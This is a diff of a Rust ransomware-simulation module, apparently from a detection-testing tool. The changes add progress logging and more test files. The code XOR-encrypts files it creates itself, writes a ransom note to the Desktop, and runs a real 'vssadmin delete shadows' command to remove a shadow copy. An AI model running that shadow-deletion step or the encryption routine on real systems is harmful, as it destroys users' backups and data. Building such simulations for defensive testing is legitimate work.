@@ -12,11 +12,11 @@ use serde::Serialize;
 use std::fs::{create_dir_all, File, OpenOptions};
 use std::io::{Read, Write};
 use std::path::{Path, PathBuf};
-use std::time::{Instant};
+use std::time::Instant;
 use std::process::{Command, Stdio};
 
 /// Number of test files to create in the repo (tuneable).
-const DEFAULT_NUM_FILES: usize = 2000;
+const DEFAULT_NUM_FILES: usize = 10000;
 /// Per-file size in bytes (simple small content); files will include textual headers.
 const PER_FILE_SIZE: usize = 512;
 /// XOR key used to "encrypt" files (reversible).
@@ -91,18 +91,20 @@ impl RansomSimulation {
         let mut paths = Vec::with_capacity(n);
 
         for i in 0..n {
+            if i % 500 == 0 {
+                logger::info(&format!("  → creating files... {}/{}", i, n));
+            }
+
             let filename = format!("file_{:06}.txt", i + 1);
             let mut path = repo.to_path_buf();
             path.push(filename);
 
-            // Content: header with test id + filler
             let mut file = File::create(&path)
                 .with_context(|| format!("creating file {}", path.display()))?;
 
             let header = format!("MAGNET-TEST-FILE\nIndex: {}\n\n", i + 1);
             let mut content = header.into_bytes();
 
-            // Fill to PER_FILE_SIZE with deterministic content
             while content.len() < PER_FILE_SIZE {
                 content.extend_from_slice(b"The quick brown fox jumps over the lazy dog.\n");
             }
@@ -110,6 +112,7 @@ impl RansomSimulation {
 
             file.write_all(&content)
                 .with_context(|| format!("writing to file {}", path.display()))?;
+
             paths.push(path);
         }
 
@@ -118,7 +121,6 @@ impl RansomSimulation {
 
     /// Simple in-place "encryption" using XOR key. Overwrites the file content.
     fn encrypt_file_inplace(path: &Path) -> Result<()> {
-        // Read file
         let mut buf = Vec::new();
         {
             let mut f = File::open(path).with_context(|| format!("opening for read: {}", path.display()))?;
@@ -126,12 +128,10 @@ impl RansomSimulation {
                 .with_context(|| format!("reading file {}", path.display()))?;
         }
 
-        // XOR
         for b in &mut buf {
             *b ^= XOR_KEY;
         }
 
-        // Overwrite (truncate) with encrypted bytes
         let mut f = OpenOptions::new()
             .write(true)
             .truncate(true)
@@ -139,15 +139,14 @@ impl RansomSimulation {
             .with_context(|| format!("opening for write: {}", path.display()))?;
         f.write_all(&buf)
             .with_context(|| format!("writing encrypted file {}", path.display()))?;
+
         Ok(())
     }
 
     fn simulate_shadow_delete(_cfg: &Config) -> Result<String> {
         let volume = "C:".to_string();
+        logger::info(&format!("deleting oldest shadow copy on volume {}...", volume));
 
-        println!("\nDeleting the oldest shadow copy on volume {}...", volume);
-
-        // Run the vssadmin command
         let output = Command::new("vssadmin")
             .args(["delete", "shadows", &format!("/for={}", volume), "/oldest", "/quiet"])
             .stdout(Stdio::piped())
@@ -155,27 +154,19 @@ impl RansomSimulation {
             .output()?;
 
         if output.status.success() {
-            Ok(format!(
-                "Successfully deleted the oldest shadow copy on volume {}.",
-                volume
-            ))
+            Ok(format!("Successfully deleted the oldest shadow copy on volume {}.", volume))
         } else {
             let err_msg = String::from_utf8_lossy(&output.stderr);
-            Ok(format!(
-                "Failed to delete shadow copy on {}: {}",
-                volume, err_msg
-            ))
+            Ok(format!("Failed to delete shadow copy on {}: {}", volume, err_msg))
         }
     }
 
-
-
-    /// Write the detailed telemetry JSON + human log for this ransom simulation.
     fn write_detailed_telemetry(cfg: &Config, rec: &RansomTelemetry) -> Result<()> {
-        let dir = Self::telemetry_dir().ok_or_else(|| anyhow::anyhow!("could not determine telemetry output path"))?;
-        create_dir_all(&dir).with_context(|| format!("creating telemetry directory {}", dir.display()))?;
+        let dir = Self::telemetry_dir()
+            .ok_or_else(|| anyhow::anyhow!("could not determine telemetry output path"))?;
+        create_dir_all(&dir)
+            .with_context(|| format!("creating telemetry directory {}", dir.display()))?;
 
-        // jsonl
         let mut jsonl = dir.clone();
         jsonl.push(format!("ransom_sim_{}.jsonl", cfg.test_id));
         let mut jf = OpenOptions::new()
@@ -183,10 +174,8 @@ impl RansomSimulation {
             .append(true)
             .open(&jsonl)
             .with_context(|| format!("opening telemetry file {}", jsonl.display()))?;
-        let j = serde_json::to_string(rec)?;
-        writeln!(jf, "{}", j)?;
+        writeln!(jf, "{}", serde_json::to_string(rec)?)?;
 
-        // human-readable log
         let mut log = dir;
         log.push(format!("ransom_sim_{}.log", cfg.test_id));
         let mut lf = OpenOptions::new()
@@ -216,16 +205,16 @@ impl Simulation for RansomSimulation {
 
     fn run(&self, cfg: &Config) -> Result<()> {
         let start = Instant::now();
-
         let test_id = &cfg.test_id;
         let note_content = Self::build_note_content(test_id);
 
         let desktop = Self::desktop_path().context("could not determine Desktop path")?;
         let note_path = Self::note_path(&desktop);
 
-        logger::action_running("Simulating ransomware: create repo, encrypt files, oldest sc deletion, drop note");
+        logger::action_running(
+            "Simulating ransomware: create repo, encrypt files, oldest sc deletion, drop note",
+        );
 
-        // Dry-run: only report intentions and write an action record
         if cfg.dry_run {
             logger::info("dry-run: would create repo and encrypt files");
             let rec = ActionRecord {
@@ -241,10 +230,18 @@ impl Simulation for RansomSimulation {
             return Ok(());
         }
 
-        // 1) Create repo and files
-        let repo = Self::make_repo_path(cfg).ok_or_else(|| anyhow::anyhow!("could not determine repo path"))?;
+        // -----------------------------------------------------
+        // 1) Create repo + files
+        // -----------------------------------------------------
+        logger::info("\ncreating test repository and files...");
+        let repo = Self::make_repo_path(cfg)
+            .ok_or_else(|| anyhow::anyhow!("could not determine repo path"))?;
+
         let files = match Self::create_test_files(&repo, DEFAULT_NUM_FILES) {
-            Ok(paths) => paths,
+            Ok(paths) => {
+                logger::info("file creation complete.");
+                paths
+            }
             Err(e) => {
                 logger::action_fail("failed to create repo files");
                 let rec = ActionRecord {
@@ -260,18 +257,29 @@ impl Simulation for RansomSimulation {
             }
         };
 
-        // 2) Encrypt files in-place (only the created ones)
+        // -----------------------------------------------------
+        // 2) Encrypt created files
+        // -----------------------------------------------------
+        logger::info("encrypting files in-place...");
         let mut encrypted = 0usize;
-        for p in &files {
+
+        for (idx, p) in files.iter().enumerate() {
+            if idx % 500 == 0 {
+                logger::info(&format!("  → encrypting... {}/{}", idx, files.len()));
+            }
+
             if let Err(e) = Self::encrypt_file_inplace(p) {
                 logger::warn(&format!("encryption failed for {}: {}", p.display(), e));
-                // continue with others
             } else {
                 encrypted += 1;
             }
         }
 
-        // 3) VSS deletion
+        logger::info("encryption complete.");
+
+        // -----------------------------------------------------
+        // 3) Delete oldest shadow copy
+        // -----------------------------------------------------
         let shadow_action = match Self::simulate_shadow_delete(cfg) {
             Ok(s) => s,
             Err(e) => {
@@ -280,7 +288,11 @@ impl Simulation for RansomSimulation {
             }
         };
 
-        // 4) Write ransom note to Desktop
+        // -----------------------------------------------------
+        // 4) Write ransom note
+        // -----------------------------------------------------
+        logger::info("writing ransom note to Desktop...");
+
         match OpenOptions::new()
             .create(true)
             .write(true)
@@ -307,7 +319,11 @@ impl Simulation for RansomSimulation {
             }
         }
 
-        // Done - write telemetry
+        // -----------------------------------------------------
+        // 5) Telemetry
+        // -----------------------------------------------------
+        logger::info("writing simulation telemetry...");
+
         let elapsed = start.elapsed();
         let parent = std::env::current_exe()
             .map(|p| p.display().to_string())
@@ -328,7 +344,7 @@ impl Simulation for RansomSimulation {
             logger::warn(&format!("failed to write detailed telemetry: {}", e));
         }
 
-        // Also write action record
+        // Action record
         let rec = ActionRecord {
             test_id: cfg.test_id.clone(),
             timestamp: Utc::now().to_rfc3339(),
